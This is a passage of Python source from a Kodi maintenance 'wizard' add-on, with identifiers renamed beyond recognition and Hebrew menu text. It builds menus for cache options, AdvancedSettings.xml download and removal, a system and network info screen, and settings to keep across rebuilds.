		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00OOO0OO0OOOO000 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2908
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2909
	addFile ('Include Video Cache in Clear Cache: %s'%O00000O0O0OOO0OO0 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2910
	if O00000O0O0OOO0OO0 =='true':#line:2911
		addFile ('--- Include All Video Addons: %s'%OOOOOOO0OOOO0OOOO .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Bob: %s'%O0OO0O0O00OO00O0O .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Phoenix: %s'%OO00O0OO00OO0O000 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Specto: %s'%O000O0OO0O0OOOOO0 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Exodus: %s'%OOO00OOOO0O0OOOO0 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include Salts: %s'%OO0OOOOO000OOO000 .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Salts HD Lite: %s'%OO0OO0000OOOOOO0O .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Include One Channel: %s'%OO0OOOOOO00OO00OO .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Include Genesis: %s'%O0O000O0OO0O0O00O .replace ('true',OOO0O0O0OO0000000 ).replace ('false',OOO0OOOO0O0OOOO0O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2920
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2922
	setView ('files','viewType')#line:2923
def advancedWindow (url =None ):#line:2925
	if not ADVANCEDFILE =='http://':#line:2926
		if url ==None :#line:2927
			O000OOO0000O0O00O =wiz .workingURL (ADVANCEDFILE )#line:2928
			O00O00O0OO000O000 =uservar .ADVANCEDFILE #line:2929
		else :#line:2930
			O000OOO0000O0O00O =wiz .workingURL (url )#line:2931
			O00O00O0OO000O000 =url #line:2932
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2933
		if os .path .exists (ADVANCED ):#line:2934
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2935
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2936
		if O000OOO0000O0O00O ==True :#line:2937
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2938
			O0000O00O0OO0OOOO =wiz .openURL (O00O00O0OO000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2939
			OOOO000OOOO00OO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000O00O0OO0OOOO )#line:2940
			if len (OOOO000OOOO00OO00 )>0 :#line:2941
				for OOO00OOO0OOOOOOOO ,OO0OOO00O0O00O00O ,url ,OO00000OOOO0O0O00 ,OO00OOOOOO000O0O0 ,O0O0OO0000O0OOOO0 in OOOO000OOOO00OO00 :#line:2942
					if OO0OOO00O0O00O00O .lower ()=="yes":#line:2943
						addDir ("[B]%s[/B]"%OOO00OOO0OOOOOOOO ,'advancedsetting',url ,description =O0O0OO0000O0OOOO0 ,icon =OO00000OOOO0O0O00 ,fanart =OO00OOOOOO000O0O0 ,themeit =THEME3 )#line:2944
					else :#line:2945
						addFile (OOO00OOO0OOOOOOOO ,'writeadvanced',OOO00OOO0OOOOOOOO ,url ,description =O0O0OO0000O0OOOO0 ,icon =OO00000OOOO0O0O00 ,fanart =OO00OOOOOO000O0O0 ,themeit =THEME2 )#line:2946
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2947
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O000OOO0000O0O00O )#line:2948
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2949
def writeAdvanced (OOOO00000OOO0OOOO ,O000O0000O0OOOOO0 ):#line:2951
	OOOOO0O0OO00O0OOO =wiz .workingURL (O000O0000O0OOOOO0 )#line:2952
	if OOOOO0O0OO00O0OOO ==True :#line:2953
		if os .path .exists (ADVANCED ):OOO00O000000O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO00000OOO0OOOO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2954
		else :OOO00O000000O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO00000OOO0OOOO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2955
		if OOO00O000000O00O0 ==1 :#line:2957
			OO00O0O00O0O0000O =wiz .openURL (O000O0000O0OOOOO0 )#line:2958
			O0OO0O00O0OOOO00O =open (ADVANCED ,'w');#line:2959
			O0OO0O00O0OOOO00O .write (OO00O0O00O0O0000O )#line:2960
			O0OO0O00O0OOOO00O .close ()#line:2961
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2962
			wiz .killxbmc (True )#line:2963
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2964
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOO0O0OO00O0OOO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2965
def viewAdvanced ():#line:2967
	OOO00000OOO0O0O0O =open (ADVANCED )#line:2968
	OOO00000O0000OO0O =OOO00000OOO0O0O0O .read ().replace ('\t','    ')#line:2969
	wiz .TextBox (ADDONTITLE ,OOO00000O0000OO0O )#line:2970
	OOO00000OOO0O0O0O .close ()#line:2971
def removeAdvanced ():#line:2973
	if os .path .exists (ADVANCED ):#line:2974
		wiz .removeFile (ADVANCED )#line:2975
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2976
def showAutoAdvanced ():#line:2978
	notify .autoConfig ()#line:2979
def getIP ():#line:2981
	OO0O0O00O000O0OOO ='http://whatismyipaddress.com/'#line:2982
	if not wiz .workingURL (OO0O0O00O000O0OOO ):return 'Unknown','Unknown','Unknown'#line:2983
	OOO0OOOOO0OO0OO0O =wiz .openURL (OO0O0O00O000O0OOO ).replace ('\n','').replace ('\r','')#line:2984
	if not 'Access Denied'in OOO0OOOOO0OO0OO0O :#line:2985
		OOOOO0OOO0O0O0OO0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO0OOOOO0OO0OO0O )#line:2986
		O00OO0O00O000O0OO =OOOOO0OOO0O0O0OO0 [0 ]if (len (OOOOO0OOO0O0O0OO0 )>0 )else 'Unknown'#line:2987
		O0000O000O0OO00O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO0OOOOO0OO0OO0O )#line:2988
		O0O0OO0000O0OOO00 =O0000O000O0OO00O0 [0 ]if (len (O0000O000O0OO00O0 )>0 )else 'Unknown'#line:2989
		O0O0000O00OO0O00O =O0000O000O0OO00O0 [1 ]+', '+O0000O000O0OO00O0 [2 ]+', '+O0000O000O0OO00O0 [3 ]if (len (O0000O000O0OO00O0 )>2 )else 'Unknown'#line:2990
		return O00OO0O00O000O0OO ,O0O0OO0000O0OOO00 ,O0O0000O00OO0O00O #line:2991
	else :return 'Unknown','Unknown','Unknown'#line:2992
def systemInfo ():#line:2994
	OO0OOOOO00000OOOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3008
	O0OO0000O00O00000 =[];O0O00O0O0O00O0O0O =0 #line:3009
	for O0OOOO0OOO0O00OOO in OO0OOOOO00000OOOO :#line:3010
		O0O00O0O0000OO000 =wiz .getInfo (O0OOOO0OOO0O00OOO )#line:3011
		OO0000O0000OO0OOO =0 #line:3012
		while O0O00O0O0000OO000 =="Busy"and OO0000O0000OO0OOO <10 :#line:3013
			O0O00O0O0000OO000 =wiz .getInfo (O0OOOO0OOO0O00OOO );OO0000O0000OO0OOO +=1 ;wiz .log ("%s sleep %s"%(O0OOOO0OOO0O00OOO ,str (OO0000O0000OO0OOO )));xbmc .sleep (1000 )#line:3014
		O0OO0000O00O00000 .append (O0O00O0O0000OO000 )#line:3015
		O0O00O0O0O00O0O0O +=1 #line:3016
	O0O0O0OOO00O00OO0 =O0OO0000O00O00000 [8 ]if 'Una'in O0OO0000O00O00000 [8 ]else wiz .convertSize (int (float (O0OO0000O00O00000 [8 ][:-8 ]))*1024 *1024 )#line:3017
	O00O000O000O00O0O =O0OO0000O00O00000 [9 ]if 'Una'in O0OO0000O00O00000 [9 ]else wiz .convertSize (int (float (O0OO0000O00O00000 [9 ][:-8 ]))*1024 *1024 )#line:3018
	OOO0O00OOOOOOO00O =O0OO0000O00O00000 [10 ]if 'Una'in O0OO0000O00O00000 [10 ]else wiz .convertSize (int (float (O0OO0000O00O00000 [10 ][:-8 ]))*1024 *1024 )#line:3019
	O0OO0OO00OOOO0000 =wiz .convertSize (int (float (O0OO0000O00O00000 [11 ][:-2 ]))*1024 *1024 )#line:3020
	O0OO000O000OOO000 =wiz .convertSize (int (float (O0OO0000O00O00000 [12 ][:-2 ]))*1024 *1024 )#line:3021
	O0000OO0OOO0O0000 =wiz .convertSize (int (float (O0OO0000O00O00000 [13 ][:-2 ]))*1024 *1024 )#line:3022
	OOO0OO0OO0OO0OOOO ,O0O0OOO0OOOOO00OO ,O0OOO0O0OOO00OO00 =getIP ()#line:3023
	O00O0OOO0OO00O000 =[];O00O0O0OOOOO0OOOO =[];O0O0OO00O0O0000O0 =[];O0OO00O00OO0000O0 =[];OO0OOO0O00O000000 =[];O00O000O0O0O00000 =[];O00OOO0O0OOOOO0O0 =[]#line:3025
	O0OO0OO00O00O0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3027
	for O000O00O0O00O00OO in sorted (O0OO0OO00O00O0O0O ,key =lambda O0OOOO00OO0OO000O :O0OOOO00OO0OO000O ):#line:3028
		OOO0O00OOOO0O0O00 =os .path .split (O000O00O0O00O00OO [:-1 ])[1 ]#line:3029
		if OOO0O00OOOO0O0O00 =='packages':continue #line:3030
		OOOO000O0O000OO00 =os .path .join (O000O00O0O00O00OO ,'addon.xml')#line:3031
		if os .path .exists (OOOO000O0O000OO00 ):#line:3032
			OO0000O0OOO000000 =open (OOOO000O0O000OO00 )#line:3033
			O0000O0O0OOOO000O =OO0000O0OOO000000 .read ()#line:3034
			OOOOOO0OO00000OO0 =re .compile ("<provides>(.+?)</provides>").findall (O0000O0O0OOOO000O )#line:3035
			if len (OOOOOO0OO00000OO0 )==0 :#line:3036
				if OOO0O00OOOO0O0O00 .startswith ('skin'):O00OOO0O0OOOOO0O0 .append (OOO0O00OOOO0O0O00 )#line:3037
				if OOO0O00OOOO0O0O00 .startswith ('repo'):OO0OOO0O00O000000 .append (OOO0O00OOOO0O0O00 )#line:3038
				else :O00O000O0O0O00000 .append (OOO0O00OOOO0O0O00 )#line:3039
			elif not (OOOOOO0OO00000OO0 [0 ]).find ('executable')==-1 :O0OO00O00OO0000O0 .append (OOO0O00OOOO0O0O00 )#line:3040
			elif not (OOOOOO0OO00000OO0 [0 ]).find ('video')==-1 :O0O0OO00O0O0000O0 .append (OOO0O00OOOO0O0O00 )#line:3041
			elif not (OOOOOO0OO00000OO0 [0 ]).find ('audio')==-1 :O00O0O0OOOOO0OOOO .append (OOO0O00OOOO0O0O00 )#line:3042
			elif not (OOOOOO0OO00000OO0 [0 ]).find ('image')==-1 :O00O0OOO0OO00O000 .append (OOO0O00OOOO0O0O00 )#line:3043
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3046
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3049
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3050
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0OOO00O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O000O000O00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O00OOOOOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OO00OOOO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O000OOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0OOO0O0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0OO0OO0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOO0OOOOO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0OOO00OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0000O00O00000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	O00OO000000O00OO0 =len (O00O0OOO0OO00O000 )+len (O00O0O0OOOOO0OOOO )+len (O0O0OO00O0O0000O0 )+len (O0OO00O00OO0000O0 )+len (O00O000O0O0O00000 )+len (O00OOO0O0OOOOO0O0 )+len (OO0OOO0O00O000000 )#line:3073
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O00OO000000O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO00O0O0000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO00O00OO0000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0O0OOOOO0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0OOO0OO00O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OOO0O00O000000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO0O0OOOOO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3080
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O000O0O0O00000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3081
def Menu ():#line:3082
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3083
def saveMenu ():#line:3085
	O000O0000O0O00O0O ='[COLOR yellow]מופעל[/COLOR]';O0O0O0OO00O0OOOOO ='[COLOR blue]מבוטל[/COLOR]'#line:3087
	OOO0O0OOOO000OOO0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3088
	OOO00O0O000O00000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3089
	OO0OOOOO0OOO0O0O0 ='true'if KEEPINFO =='true'else 'false'#line:3090
	O0O0OO00000O000OO ='true'if KEEPSOUND =='true'else 'false'#line:3092
	O0OOO0OOO0000O000 ='true'if KEEPVIEW =='true'else 'false'#line:3093
	OOO0O0OO000OOOO00 ='true'if KEEPSKIN =='true'else 'false'#line:3094
	O0O00O00OOO0OOO0O ='true'if KEEPSKIN2 =='true'else 'false'#line:3095
	O0O0O0OOOO0O0O0O0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3096
	O0OO0000OOOO00OOO ='true'if KEEPADDONS =='true'else 'false'#line:3097
	O0OO0O0000O00000O ='true'if KEEPPVR =='true'else 'false'#line:3098
	OO0OO0OOO0O00OOOO ='true'if KEEPTVLIST =='true'else 'false'#line:3099
	O0O00OOOO0O0O0000 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3100
	OO00O00O0OOO0OOOO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3101
	O0OO0OO00OO0O0000 ='true'if KEEPHUBTV =='true'else 'false'#line:3102
	OO0OO0O000O0OO000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3103
	OOOO00OOOOOO0O0OO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3104
	OO0OO000000O00O0O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3105
	OO0OOOO0O0O000000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3106
	OOOOO000O00000OO0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3107
	O0OO000O0O0O0OOO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3108
	O000OO0O000O000O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3109
	O00O0OO0OOOO0O00O ='true'if KEEPREAL =='true'else 'false'#line:3110
	O0OOOO0OO000O00O0 ='true'if KEEPRD2 =='true'else 'false'#line:3111
	OOO0OOOOO00OOO0OO ='true'if KEEPTORNET =='true'else 'true'#line:3112
	O0OO0OOOOO00OO00O ='true'if KEEPLOGIN =='true'else 'false'#line:3113
	O0O00O0OOO0000O00 ='true'if KEEPSOURCES =='true'else 'false'#line:3114
	OOO00OOO0O00OO00O ='true'if KEEPADVANCED =='true'else 'false'#line:3115
	OO00O0OOOOOO00000 ='true'if KEEPPROFILES =='true'else 'false'#line:3116
	OOOOO000OO0OOO000 ='true'if KEEPFAVS =='true'else 'false'#line:3117
	OO0OOOOO00O00OO0O ='true'if KEEPREPOS =='true'else 'false'#line:3118
	OOOOO00O000O00O0O ='true'if KEEPSUPER =='true'else 'false'#line:3119
	O0OOOOO0OO0O0000O ='true'if KEEPWHITELIST =='true'else 'false'#line:3120
	O0O00OO00O0O0OOO0 ='true'if KEEPWEATHER =='true'else 'false'#line:3121
	OOO0OOOOO0000O000 ='true'if KEEPVICTORY =='true'else 'false'#line:3122
	OO0OOOO0000O0O00O ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3123
	if O0OOOOO0OO0O0000O =='true':#line:3125
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3126
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3128
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3129
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3130
	addFile ('%s שמירת חשבון RD:  '%O00O0OO0OOOO0O00O .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת חשבון טראקט:  '%O000OO0O000O000O0 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת מועדפים:  '%OOOOO000OO0OOO000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OO0O0000O00000O .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OOO0OOOOO0000O000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת חשבון טלמדיה:  '%OO0OOOO0000O0O00O .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO0OO0OOO0O00OOOO .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח סרטים:  '%O0O00OOOO0O0O0000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח סדרות:  '%OO00O00O0OOO0OOOO .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח טלויזיה:  '%O0OO0OO00OO0O0000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0OO0O000O0OO000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח ספורט:  '%OOOO00OOOOOO0O0OO .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת אריח ילדים:  '%OO0OO000000O00O0O .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת אריח מוסיקה:  '%OO0OOOO0O0O000000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOOO000O00000OO0 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת כל האריחים בסקין:  '%OOO0O0OO000OOOO00 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0O00OO00O0O0OOO0 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OO0000OOOO00OOO .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3157
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OO0OOOOO0OOO0O0O0 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO00O0O000O00000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
